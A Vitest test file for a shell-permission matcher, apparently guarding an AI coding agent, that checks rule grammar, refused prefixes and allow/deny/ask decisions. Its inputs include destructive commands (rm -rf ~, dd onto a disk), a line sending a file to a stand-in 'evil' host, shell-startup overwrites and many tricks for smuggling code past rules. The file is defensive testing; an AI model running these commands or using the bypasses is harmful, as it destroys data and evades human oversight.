/**
 * Issue #28 P1a — rules language, refused-prefix list, arity suggestion and the
 * AST shell matcher (compound commands, substitutions, wrappers, floors).
 */
import { describe, expect, it } from "vitest";
import {
  canonicalRuleSpecifier,
  formatRuleSpecifier,
  isRuleSpecifier,
  matchesMcpTool,
  matchesWebFetchHost,
  parseRuleSpecifier,
  RuleSpecifierError,
} from "../rules/rule-specifier.js";
import { refusedShellPrefix, suggestShellPrefix } from "../rules/shell-prefix-policy.js";
import {
  analyzeShellForRules,
  evaluateShellRules,
  type ShellRuleInput,
  type ShellRuleSet,
} from "../rules/shell-rule-matcher.js";

function bash(pattern: string): ShellRuleInput {
  const spec = parseRuleSpecifier(pattern);
  if (spec.kind !== "bash") throw new Error("not bash");
  return { pattern, spec };
}
function rules(input: { allow?: string[]; deny?: string[]; ask?: string[] }): ShellRuleSet {
  return {
    allow: (input.allow ?? []).map(bash),
    deny: (input.deny ?? []).map(bash),
    ask: (input.ask ?? []).map(bash),
  };
}

describe("rule specifier grammar", () => {
  it("round-trips every kind in canonical form", () => {
    for (const text of [
      "Bash(git status *)",
      "Bash(npm test)",
      "Edit(/home/u/project/**)",
      "Edit(/home/u/project/a.txt)",
      "WebFetch(domain:example.com)",
      "WebFetch(domain:*.example.com)",
      "Mcp(github)",
      "Mcp(github:create_issue)",
    ]) {
      expect(formatRuleSpecifier(parseRuleSpecifier(text))).toBe(text);
      expect(canonicalRuleSpecifier(text)).toBe(text);
    }
  });

  it("classifies legacy glob patterns by shape and leaves them alone", () => {
    expect(isRuleSpecifier("web_fetch")).toBe(false);
    expect(isRuleSpecifier("write_file:path:/a(b)")).toBe(false);
    expect(isRuleSpecifier("mcp_*")).toBe(false);
    expect(isRuleSpecifier("Bash(ls *)")).toBe(true);
  });

  it.each([
    ["Bash(*)", /bare \*/],
    ["Bash()", /empty/],
    ["Bash(git  status)", /single spaces/],
    ["Bash(git st*)", /shell syntax or a wildcard/],
    ["Bash(ls; rm *)", /shell syntax/],
    ["Bash(echo $(id) *)", /shell syntax/],
    ["Edit(relative/**)", /absolute/],
    ["Edit(/a/../b/**)", /normalized/],
    ["Edit(/a/*.ts)", /trailing \/\*\*/],
    ["WebFetch(example.com)", /domain:/],
    ["WebFetch(domain:*.com)", /registrable/],
    ["WebFetch(domain:a.*.com)", /invalid host/],
    ["WebFetch(domain:Example.com)", /lower case/],
    ["Mcp(a b)", /server id/],
    ["Read(/x)", /expected/],
  ])("rejects %s", (text, message) => {
    expect(() => parseRuleSpecifier(text)).toThrow(RuleSpecifierError);
    expect(() => parseRuleSpecifier(text)).toThrow(message);
  });

  it("matches hosts and MCP tools exactly (pure matchers for P1c)", () => {
    const host = parseRuleSpecifier("WebFetch(domain:*.example.com)");
    if (host.kind !== "webfetch") throw new Error();
    expect(matchesWebFetchHost(host, "api.example.com")).toBe(true);
    expect(matchesWebFetchHost(host, "example.com")).toBe(false);
    expect(matchesWebFetchHost(host, "evilexample.com")).toBe(false);
    const mcp = parseRuleSpecifier("Mcp(github:create_issue)");
    if (mcp.kind !== "mcp") throw new Error();
    expect(matchesMcpTool(mcp, "github", "create_issue")).toBe(true);
    expect(matchesMcpTool(mcp, "github", "delete_repo")).toBe(false);
  });
});

describe("refused prefixes (single shared list)", () => {
  it.each([
    [[], "empty"],
    [["bash"], "shell"],
    [["sh"], "shell"],
    [["/bin/zsh"], "shell"],
    [["python"], "interpreter"],
    [["python3", "-c"], "interpreter"],
    [["/usr/bin/python3.12"], "interpreter"],
    [["node", "-e"], "interpreter"],
    // A script-file prefix runs code the rules cannot read.
    [["python", "scripts/gen.py"], "interpreter"],
    [["node", "scripts/build.mjs"], "interpreter"],
    [["bun", "run", "./x.ts"], "interpreter"],
    [["unbuffer"], "wrapper"],
    [["env"], "wrapper"],
    [["env", "FOO=1", "ls"], "wrapper"],
    [["xargs"], "wrapper"],
    [["sudo", "ls"], "wrapper"],
    [["eval"], "wrapper"],
    [["exec"], "wrapper"],
    [["source"], "wrapper"],
    [["timeout"], "wrapper"],
    [["nice"], "wrapper"],
    [["busybox"], "wrapper"],
    [["git", "config"], "config-writer"],
    [["npx"], "package-runner"],
    [["npm", "exec"], "package-runner"],
    [["bun", "x"], "package-runner"],
    [["git"], "multi-verb-tool"],
    [["git", "-c"], "multi-verb-tool"],
    [["npm"], "multi-verb-tool"],
  ])("refuses %j (%s)", (tokens, reason) => {
    expect(refusedShellPrefix(tokens as string[])).toBe(reason);
  });

  it.each([
    [["git", "status"]],
    [["npm", "test"]],
    [["bun", "run"]],
    [["bun", "run", "build"]],
    [["deno", "task", "build"]],
    [["ls"]],
    [["npx", "prettier"]],
  ])("accepts %j", (tokens) => {
    expect(refusedShellPrefix(tokens as string[])).toBeNull();
  });
});

describe("arity-table suggestion", () => {
  it.each([
    [["git", "status", "--short"], ["git", "status"]],
    [["git", "commit", "-m", "x"], ["git", "commit"]],
    [["npm", "test", "--", "foo"], ["npm", "test"]],
    [["npm", "run", "build", "--watch"], ["npm", "run", "build"]],
    [["bun", "run", "test:vitest", "a.ts"], ["bun", "run", "test:vitest"]],
    [["docker", "ps", "-a"], ["docker", "ps"]],
    [["ls", "-la", "src"], ["ls"]],
    [["cat", "README.md"], ["cat"]],
  ])("%j → %j", (argv, expected) => {
    expect(suggestShellPrefix(argv)).toEqual(expected);
  });

  it.each([
    [["bash", "-c", "ls"]],
    [["python", "-c", "print(1)"]],
    [["sudo", "ls"]],
    [["git", "-C", "dir", "status"]],
    [[undefined, "x"]],
    [["env", "FOO=1", "ls"]],
  ])("refuses a persistent suggestion for %j", (argv) => {
    expect(suggestShellPrefix(argv as (string | undefined)[])).toBeNull();
  });
});

describe("AST shell matcher", () => {
  it("matches token-wise: `ls *` does not cover `lsof`", () => {
    const set = rules({ allow: ["Bash(ls *)"] });
    expect(evaluateShellRules("ls -la", set).decision).toBe("allow");
    expect(evaluateShellRules("ls", set).decision).toBe("allow");
    expect(evaluateShellRules("lsof -i", set).decision).toBeNull();
  });

  it("exact rules match only the exact argv", () => {
    const set = rules({ allow: ["Bash(npm test)"] });
    expect(evaluateShellRules("npm test", set).decision).toBe("allow");
    expect(evaluateShellRules("npm test -- foo", set).decision).toBeNull();
  });

  it("requires every subcommand of a compound command to be covered", () => {
    const set = rules({ allow: ["Bash(git status *)", "Bash(ls *)"] });
    expect(evaluateShellRules("git status && ls -la | ls", set)).toMatchObject({ decision: "allow" });
    expect(evaluateShellRules("git status; ls || git status -s", set).decision).toBe("allow");
    expect(evaluateShellRules("git status && curl https://x.test", set).decision).toBeNull();
    expect(evaluateShellRules("(git status) & curl x", set).decision).toBeNull();
    expect(evaluateShellRules("for f in a b; do ls $f; done", set).decision).toBe("allow");
    expect(evaluateShellRules("for f in a b; do rm $f; done", set).decision).toBeNull();
  });

  it("never allows through substitutions, env injection, write redirects or function definitions", () => {
    const set = rules({ allow: ["Bash(echo *)", "Bash(git status *)"] });
    expect(evaluateShellRules("echo $(git status)", set).decision).toBeNull();
    expect(evaluateShellRules("echo `git status`", set).decision).toBeNull();
    expect(evaluateShellRules("GIT_DIR=/tmp/x git status", set).decision).toBeNull();
    expect(evaluateShellRules("PATH=/tmp/evil; git status", set).decision).toBeNull();
    expect(evaluateShellRules("echo hi > ~/.bashrc", set).decision).toBeNull();
    expect(evaluateShellRules("echo hi > /dev/null", set).decision).toBe("allow");
    expect(evaluateShellRules("echo hi 2>&1", set).decision).toBe("allow");
    expect(evaluateShellRules("git() { rm -rf ~; }; git status", set).decision).toBeNull();
    expect(evaluateShellRules("$CMD status", set).decision).toBeNull();
  });

  it("unparseable or unsupported input matches no allow rule", () => {
    const set = rules({ allow: ["Bash(echo *)"] });
    expect(evaluateShellRules("echo 'unterminated", set).decision).toBeNull();
    expect(evaluateShellRules("case x in x) echo hi;; esac", set).decision).toBeNull();
    expect(analyzeShellForRules("echo 'unterminated").ok).toBe(false);
  });

  it("floor: a destructive command is never allowed, whatever the rules say", () => {
    const set = rules({ allow: ["Bash(rm *)", "Bash(chmod *)", "Bash(dd *)"] });
    expect(evaluateShellRules("rm -rf build", set)).toMatchObject({ decision: null, reason: "destructive command (floor)" });
    expect(evaluateShellRules("chmod 777 x", set).decision).toBeNull();
    expect(evaluateShellRules("dd if=/dev/zero of=/dev/disk0", set).decision).toBeNull();
    expect(evaluateShellRules("rm build.log", set).decision).toBe("allow");
  });

  it("deny > ask > allow regardless of order or specificity", () => {
    const set = rules({ allow: ["Bash(git push *)"], ask: ["Bash(git *)"], deny: ["Bash(git push --force *)"] });
    expect(evaluateShellRules("git push --force origin", set)).toMatchObject({ decision: "deny", pattern: "Bash(git push --force *)" });
    expect(evaluateShellRules("git push origin", set)).toMatchObject({ decision: "ask", pattern: "Bash(git *)" });
  });

  it("deny/ask see inside $(), subshells, loops, functions and through wrappers", () => {
    const set = rules({ deny: ["Bash(rm *)"] });
    for (const command of [
      "echo $(rm -f x)",
      "echo `rm x`",
      "(cd /tmp && rm x)",
      "for f in *; do rm \"$f\"; done",
      "while true; do rm x; done",
      "if true; then rm x; fi",
      "f() { rm x; }",
      "cat <(rm x)",
      "sudo rm x",
      "sudo -u root rm x",
      "env A=1 rm x",
      "timeout 5 rm x",
      "/bin/rm x",
      "X=$(rm x)",
    ]) {
      expect(evaluateShellRules(command, set).decision, command).toBe("deny");
    }
    expect(evaluateShellRules("echo rm", set).decision).toBeNull();
  });

  it("asks when a deny/ask rule cannot inspect the command", () => {
    const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(echo *)"] });
    for (const command of [
      "bash -c 'rm x'",
      "sh -lc 'rm x'",
      "python3 -c 'import os'",
      "eval 'rm x'",
      "find . -exec rm {} ;",
      "$CMD x",
      "echo 'unterminated",
      "case x in x) rm y;; esac",
    ]) {
      expect(evaluateShellRules(command, set), command).toMatchObject({ decision: "ask", pattern: null });
    }
    // Without any deny/ask rule, the same input is simply not allowed.
    expect(evaluateShellRules("bash -c 'rm x'", rules({ allow: ["Bash(echo *)"] })).decision).toBeNull();
    // deny > ask: a deny match on a visible command is not demoted by hidden code.
    expect(evaluateShellRules("eval rm x", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
    expect(evaluateShellRules("rm x; bash -c 'ls'", set)).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
  });

  it("security review: wrappers cannot hide code from deny rules", () => {
    const set = rules({ deny: ["Bash(rm *)"] });
    for (const command of [
      "env sh -c 'rm x'",
      "nohup bash -c 'rm x'",
      "timeout 5 sh -c 'rm x'",
      "xargs -I{} sh -c 'rm {}'",
      "xargs -I {} sh -c 'rm {}'",
      "sudo -u root bash -c 'rm x'",
      "env -S 'rm -rf x'",
      "su -c 'rm x'",
      "busybox sh -c 'rm x'",
    ]) {
      expect(evaluateShellRules(command, set), command).toMatchObject({ decision: "ask", pattern: null });
    }
    expect(evaluateShellRules("busybox rm -rf x", set).decision).toBe("deny");
    expect(evaluateShellRules("env A=1 busybox rm x", set).decision).toBe("deny");
  });

  it("security review: deny/ask see through a multi-verb tool's global options", () => {
    const set = rules({ deny: ["Bash(git push *)"], ask: ["Bash(kubectl delete *)"] });
    expect(evaluateShellRules("git -C . push origin", set).decision).toBe("deny");
    expect(evaluateShellRules("git -c core.x=1 --no-pager push", set).decision).toBe("deny");
    expect(evaluateShellRules("kubectl -n prod delete pod x", set).decision).toBe("ask");
    expect(evaluateShellRules("git -C . status", set).decision).toBeNull();
  });

  it("security review: an option that writes to a path disqualifies an allow", () => {
    const set = rules({ allow: ["Bash(git log *)", "Bash(sort *)", "Bash(curl *)", "Bash(find *)", "Bash(grep *)"] });
    for (const command of [
      "git log --output=~/.zshrc",
      "git log --output ~/.zshrc",
      "git log --exec-path=/tmp/x",
      "sort -o ~/.bashrc in.txt",
      "curl -o ~/.bashrc https://x.test",
      "find . -fprint ~/.zshrc",
      "find . -delete",
    ]) {
      expect(evaluateShellRules(command, set).decision, command).toBeNull();
    }
    expect(evaluateShellRules("git log -n 5 --oneline", set).decision).toBe("allow");
    expect(evaluateShellRules("grep -o foo file.txt", set).decision).toBe("allow");
    expect(evaluateShellRules("sort -n in.txt", set).decision).toBe("allow");
    expect(refusedShellPrefix(["git", "config"])).toBe("config-writer");
  });

  it("an interpreter running a script file is hidden code: asks under deny rules, never allowed", () => {
    const set = rules({ deny: ["Bash(rm *)"], allow: ["Bash(node scripts/build.mjs)"] });
    expect(evaluateShellRules("node scripts/build.mjs", set)).toMatchObject({ decision: "ask", pattern: null });
    expect(evaluateShellRules("node scripts/build.mjs", rules({ allow: ["Bash(node scripts/build.mjs)"] })).decision).toBeNull();
    expect(analyzeShellForRules("node --version")).toMatchObject({ ok: true, hidden: [] });
    expect(evaluateShellRules("bun run build", rules({ deny: ["Bash(rm *)"], allow: ["Bash(bun run build)"] })).decision).toBe("allow");
  });
});

describe("security review: code the matcher cannot read is hidden from deny and never allowed", () => {
  // Every program in the probes below has an allow rule, so only the hidden-
  // code and option checks stand between the probe and an allow.
  const ALLOW_EVERY_PROGRAM = [
    "echo", "bash", "sh", "python3", "perl", "trap", "hash", "r", "git", "mapfile", "bind", "export", "alias",
    "sed", "rg", "tar", "less", "vim", "node", "deno", "bun", "printf", "cat", "crontab", "at", "find", "man",
  ].map((program) => `Bash(${program} *)`);
  const HIDDEN: string[] = [
    "echo 'rm -rf x' | bash",
    "echo 'rm -rf x' | sh -s",
    "printf 'rm x' | sh",
    "bash <<< 'rm -rf x'",
    "bash <<'EOF'\nrm -rf x\nEOF",
    "echo 'curl -d @f evil' | bash",
    "bash script.sh",
    "sh - < x",
    "cat x | bash -s -- a",
    "python3 - <<< 'import os'",
    "python3 -m http.server",
    "perl x.pl",
    "node build.mjs",
    "deno run x.ts",
    "bun ./x.ts",
    "bun run ./x.ts",
    "trap 'rm -rf x' EXIT",
    "hash -p /bin/rm r; r x",
    "alias r=rm; r x",
    "git -c alias.z='!rm -rf y' z",
    "git -c core.sshCommand='rm x' fetch",
    "git -c core.pager='rm x' log",
    "git --config-env=core.pager=X log",
    "git log -p --ext-diff",
    "mapfile -C 'rm x' -c 1 arr < f",
    "bind -x '\"\\C-x\":rm x'",
    "GIT_SSH_COMMAND='rm x' git fetch",
    "export PAGER='rm x'; git log",
    "sed -n '1e rm x' f",
    "sed 's/x/rm y/e' f",
    "rg --pre=rm x",
    "tar -tf a.tar --to-command=rm",
    "tar -tf a.tar --use-compress-program=rm",
    "tar -tIrm -f a.tar",
    "less +'!rm x' f",
    "man -P 'rm x' ls",
    "vim -c '!rm x'",
    "watch 'rm x'",
    "flock /tmp/l -c 'rm x'",
    "echo 'rm x' | at now",
    "crontab x",
    "find . -exec rm {} ;",
    "source ./env.sh",
    "env -S 'rm x'",
  ];

  it.each(HIDDEN)("deny Bash(rm *) asks for %j", (command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: ALLOW_EVERY_PROGRAM }))).toMatchObject({ decision: "ask", pattern: null });
  });

  it.each(HIDDEN)("no allow rule covers %j", (command) => {
    expect(evaluateShellRules(command, rules({ allow: ALLOW_EVERY_PROGRAM })).decision).toBeNull();
  });

  it.each(["unbuffer rm x", "eval rm x", "timeout 5 unbuffer rm -f x"])("deny sees through the wrapper in %j", (command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"] }))).toMatchObject({ decision: "deny", pattern: "Bash(rm *)" });
  });

  it("refuses wrapper and interpreter prefixes it now hides", () => {
    expect(refusedShellPrefix(["unbuffer", "ls"])).toBe("wrapper");
    expect(refusedShellPrefix(["perl", "x.pl"])).toBe("interpreter");
  });
});

describe("security review: an allowed program's code-exec or write option asks", () => {
  it.each([
    ["Bash(sed -n *)", "sed -n '1e id' f"],
    ["Bash(sed -n *)", "sed -n 'w /tmp/pwn' f"],
    ["Bash(sed -n *)", "sed -n 's/a/b/w /tmp/pwn' f"],
    ["Bash(sed -n *)", "sed -n -f script.sed f"],
    ["Bash(sed -n *)", "sed -n -i 1p f"],
    ["Bash(sed *)", "sed -i.bak s/a/b/ f"],
    ["Bash(rg *)", "rg --pre=rm x"],
    ["Bash(rg *)", "rg --pre-glob '*' --pre rm x"],
    ["Bash(tar -tf *)", "tar -tf a.tar --to-command=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar --use-compress-program=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar -I rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar --checkpoint-action=exec=rm"],
    ["Bash(tar -tf *)", "tar -tf a.tar -x"],
    ["Bash(less *)", "less +'!rm x' f"],
    ["Bash(less *)", "less -o log f"],
    ["Bash(git log *)", "git log -p --ext-diff"],
    ["Bash(git log *)", "git log --textconv -p"],
    ["Bash(git diff *)", "git diff --ext-diff"],
    ["Bash(git grep *)", "git grep -O'rm x' foo"],
    ["Bash(git fetch *)", "git fetch --upload-pack='rm x' origin"],
    ["Bash(git rebase *)", "git rebase -x 'rm x' main"],
    ["Bash(find *)", "find . -execdir rm {} ;"],
    ["Bash(find *)", "find . -fprintf out %p"],
    ["Bash(man *)", "man --pager='rm x' ls"],
    ["Bash(rsync *)", "rsync -e 'rm x' a b"],
    ["Bash(ssh *)", "ssh -o ProxyCommand='rm x' host"],
    ["Bash(fd *)", "fd -x rm"],
  ])("%s does not allow %j", (allow, command) => {
    expect(evaluateShellRules(command, rules({ allow: [allow] })).decision).toBeNull();
  });

  it.each([
    ["Bash(git log *)", "git log --oneline"],
    ["Bash(git log *)", "git log -p --no-ext-diff -n 3"],
    ["Bash(git diff *)", "git diff HEAD~1 -- src"],
    ["Bash(rg *)", "rg foo src"],
    ["Bash(rg *)", "rg -n --glob '*.ts' foo"],
    ["Bash(sed -n *)", "sed -n 1,5p f"],
    ["Bash(sed -n *)", "sed -n '/start/,/end/p' f"],
    ["Bash(sed *)", "sed 's/a/b/g;s/c/d/' f"],
    ["Bash(sed *)", "sed -E -e 's/(a)/\\1/' f"],
    ["Bash(tar -tf *)", "tar -tf a.tar"],
    ["Bash(tar -tzf *)", "tar -tzf a.tgz"],
    ["Bash(less *)", "less +G f"],
    ["Bash(cat *)", "cat README.md"],
    ["Bash(npm run build)", "npm run build"],
    ["Bash(bun run build)", "bun run build"],
    ["Bash(find *)", "find . -name '*.ts'"],
    ["Bash(ls *)", "ls *"],
    ["Bash(ls *)", "ls -la src/*.ts"],
  ])("%s still allows %j", (allow, command) => {
    expect(evaluateShellRules(command, rules({ deny: ["Bash(rm *)"], allow: [allow] })).decision).toBe("allow");
  });
});
